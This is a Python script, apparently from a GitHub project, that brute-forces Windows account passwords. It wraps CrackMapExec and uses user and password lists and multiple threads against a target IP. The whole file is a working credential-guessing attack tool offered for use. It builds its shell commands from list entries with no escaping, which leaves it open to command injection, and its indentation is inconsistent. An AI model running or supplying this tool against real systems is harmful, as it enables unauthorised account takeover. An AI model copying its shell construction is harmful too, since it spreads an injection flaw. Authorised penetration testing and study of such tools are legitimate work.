
##
## https://github.com/ThoughtfulDev/CME-BruteForcer
##

########################################################################
#                                                                      #
#   A Windows password bruter using CrackMapExec by ThoughtfulDev      #
#   Using https://github.com/byt3bl33d3r/CrackMapExec by byt3bl33d3r   #
#                                                                      #
########################################################################

import os, subprocess, sys, argparse, threading


checkSuccessfull = False

def banner():
    "Gives the beautiful Banner <3"
    print("   _____                _    __  __             ______                 ____             _            ")
    print("  / ____|              | |  |  \/  |           |  ____|               |  _ \           | |           ")
    print(" | |     _ __ __ _  ___| | _| \  / | __ _ _ __ | |__  __  _____  ___  | |_) |_ __ _   _| |_ ___ _ __ ")
    print(" | |    | '__/ _` |/ __| |/ | |\/| |/ _` | '_ \|  __| \ \/ / _ \/ __| |  _ <| '__| | | | __/ _ | '__|")
    print(" | |____| | | (_| | (__|   <| |  | | (_| | |_) | |____ >  |  __| (__  | |_) | |  | |_| | ||  __| |   ")
    print("  \_____|_|  \__,_|\___|_|\_|_|  |_|\__,_| .__/|______/_/\_\___|\___| |____/|_|   \__,_|\__\___|_|   ")
    print("                                         | |                                  ")
    print("                                         | |                                  ")
    print("")
    print(" ########################################################################")
    print(" #                                                                      #")
    print(" #   A Windows password bruter using CrackMapExec by ThoughtfulDev      #")
    print(" #   Using https://github.com/byt3bl33d3r/CrackMapExec by byt3bl33d3r   #")
    print(" #                                                                      #")
    print(" ########################################################################")
    version = "0.1"
    strversion = """        		  """ + bcolors.BLUE + \
        """You are using Version: %s""" % (version) + bcolors.ENDC + "\n"
    print(strversion)

def main():
    global version
    global segmentCnt
    global userfile
    global passwordfile
    global ip
    global rightPW
    segmentCnt = 3

    if not sys.platform.startswith('linux'):
        print_error("Do you even Linux bro?!")
        quit()

    if os.getuid() != 0:
        print_error("You need to have root privileges to run this program!")
        quit()

    if os.path.exists('got'):
        os.remove('got')

    parser = argparse.ArgumentParser()
    # optional argument
    parser.add_argument("-t", "--threads", type=int, help="How many threads we should use, Default = 3")
    # required arguments
    required = parser.add_argument_group('required arguments')
    required.add_argument("-u", "--userfile", help="Path to userlist file", required=True)
    required.add_argument("-p", "--passwordfile", help="Path to passwordlist file", required=True)
    required.add_argument("-ip", "--ipadr", help="Ip Address to attack", required=True)
    args = parser.parse_args()

    if args.threads is not None:
        segmentCnt = args.threads


    if segmentCnt > 30:
        print_warning("Too many threads! Bumping down to 30")
        segmentCnt = 30


    userfile = args.userfile
    passwordfile = args.passwordfile
    ip = args.ipadr


    cls()
    banner()
    dependencycheck()
    readFiles()
    return



def cls():
    os.system('clear')

class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERL = '\033[4m'
    ENDC = '\033[0m'
    backBlack = '\033[40m'
    backRed = '\033[41m'
    backGreen = '\033[42m'
    backYellow = '\033[43m'
    backBlue = '\033[44m'
    backMagenta = '\033[45m'
    backCyan = '\033[46m'
    backWhite = '\033[47m'

# main status calls for print functions
def print_status(message):
    print((bcolors.GREEN) + (bcolors.BOLD) + \
        ("[*] ") + (bcolors.ENDC) + (str(message)))

def print_status_indent(message):
    print((bcolors.GREEN) + (bcolors.BOLD) + \
        ("  [*] ") + (bcolors.ENDC) + (str(message)))

def print_info(message):
    print((bcolors.BLUE) + (bcolors.BOLD) + \
        ("[-] ") + (bcolors.ENDC) + (str(message)))


def print_info_indent(message):
    print((bcolors.BLUE) + (bcolors.BOLD) + \
        ("  [-] ") + (bcolors.ENDC) + (str(message)))


def print_warning(message):
    print((bcolors.YELLOW) + (bcolors.BOLD) + \
        ("[!] ") + (bcolors.ENDC) + (str(message)))

def print_warning_indent(message):
    print((bcolors.YELLOW) + (bcolors.BOLD) + \
        ("  [!] ") + (bcolors.ENDC) + (str(message)))

def print_error(message):
    print((bcolors.RED) + (bcolors.BOLD) + \
        ("[!] ") + (bcolors.ENDC) + (bcolors.RED) + \
        (str(message)) + (bcolors.ENDC))
def print_error_indent(message):
    print((bcolors.RED) + (bcolors.BOLD) + \
        ("  [!] ") + (bcolors.ENDC) + (bcolors.RED) + \
        (str(message)) + (bcolors.ENDC))


def print_thread(threadID, message, found):
    if found:
        print_status("[Thread - " + str(threadID) + "] " + message)
    else:
        print_info_indent("[Thread - " + str(threadID) + "] " + message)

#end apperenace


def dependencycheck():
    "Checks whether all dependencies where met"

    print_info("Checking dependencies...")
    crackmapexec_inst = os.path.exists("/usr/local/bin/crackmapexec")

    if crackmapexec_inst:
        print_status_indent("CrackMapExec is installed")
        print_info_indent("Moving on...")
    else:
        print_warning("CrackMapExec could not be found in /usr/local/bin/crackmapexec")
        sys.exit(2)

    print('\n')

    if not os.path.exists(userfile):
        print_error("File '" + userfile + "' does not exist")
        sys.exit(2)

    if not os.path.exists(passwordfile):
        print_error("File '" + passwordfile + "' does not exist")
        sys.exit(2)

    return

class threadBForce (threading.Thread):
    def __init__(self, threadID,userlist, pwlist):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.pwlist = pwlist
        self.userlist = userlist
    def run(self):

        for u in self.userlist:
            for p in self.pwlist:
                if checkCreds(self.threadID, u, p, ip):
                    open('got', 'a').close()

def checkCreds(threadid, username, password, ip):

    if os.path.exists('got'):
        return

    print_thread(threadid, "(" + ip + ") -> (" + username + "|" + password + ")", False)
    cmd = "sudo crackmapexec " + ip + " -u '" + username + "' -p '" + password + "'"
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)

    with p.stdout:
	error = False
        for line in iter(p.stdout.readline, b''):
            if "FAILURE" in line:
                #cls()
                #banner()
                #print_thread(threadid, "Password found! (" + username + "|" + password + ")", True)
                #print("\n")
		error = True
                #return True
	if error == False:
		cls()
		banner()
		print_thread(threadid, "Password found! (" + username + "|" + password + ")", True)
		print("\n")
	return not error

    p.wait()  # wait for the subprocess to exit
    return False



def readFiles():

    userlist = open(userfile).read().splitlines()
    pwlist = open(passwordfile).read().splitlines()

    tmpcnt = segmentCnt
    while tmpcnt >= len(pwlist):
        tmpcnt -= 1

    # how many items will be in the last list
    elemLastLength = len(pwlist) % tmpcnt
    # how many items in each list
    listCount = len(pwlist) // tmpcnt

    if elemLastLength > 0:
        tmpcnt -= 1

    slicedPWList = []
    begin = 0
    multi = 1
    for t in range(0, tmpcnt):
        tmp = []
        for e in range(begin, listCount*multi):
            tmp.append(pwlist[e])
        begin += listCount
        multi += 1
        slicedPWList.append(tmp)

    if elemLastLength > 0:
        endList = []
        for e in range(begin, len(pwlist)):
            endList.append(pwlist[e])
        slicedPWList.append(endList)


    startThreads(userlist,slicedPWList)
    return



def startThreads(userlist,pwlist):
    cls()
    banner()
    threads = []

    checkSuccessfull = False
    threadid = 1

    for slicedPwL in pwlist:
        thread = threadBForce(threadid, userlist, slicedPwL)
        thread.start()
        threads.append(thread)
        threadid += 1




    # Wait for all threads to complete
    for t in threads:
        t.join()

    if os.path.exists('got'):
        os.remove('got')
    else:
        print_error("Password not found :(")
        print("\n")

    print_info("Thanks 4 using CME-BF :) ")
    print("\n")


if __name__ == "__main__":
    main()
